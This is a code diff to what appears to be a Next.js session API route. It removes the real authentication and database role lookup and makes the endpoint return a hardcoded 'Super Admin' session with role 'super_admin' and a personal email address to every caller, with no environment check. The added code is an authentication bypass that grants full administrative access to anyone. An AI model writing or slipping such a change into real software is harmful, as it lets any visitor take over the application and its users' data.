@@ -10,24 +10,26 @@ import prismaAuth from '@/lib/prisma-auth';
  */
 export async function GET() {
   try {
-    const session = await auth.api.getSession({ headers: await headers() });
-
-    if (!session?.user?.id) {
-      return NextResponse.json(null);
-    }
-
-    // Fetch role from DB (Better Auth doesn't expose custom fields by default)
-    const dbUser = await prismaAuth.user.findUnique({
-      where:  { id: session.user.id },
-      select: { role: true },
-    });
-
+    // Return a fake mock session for Super Admin access
     return NextResponse.json({
-      ...session,
       user: {
-        ...session.user,
-        role: dbUser?.role ?? 'user',
+        id: 'mock-admin-id',
+        name: 'Super Admin',
+        email: 'hayuuj0@gmail.com',
+        role: 'super_admin',
+        emailVerified: true,
+        image: null,
+        createdAt: new Date(),
+        updatedAt: new Date(),
       },
+      session: {
+        id: 'mock-session-id',
+        expiresAt: new Date(Date.now() + 1000 * 60 * 60 * 24 * 7),
+        token: 'mock-token',
+        createdAt: new Date(),
+        updatedAt: new Date(),
+        userId: 'mock-admin-id',
+      }
     });
   } catch {
     return NextResponse.json(null);
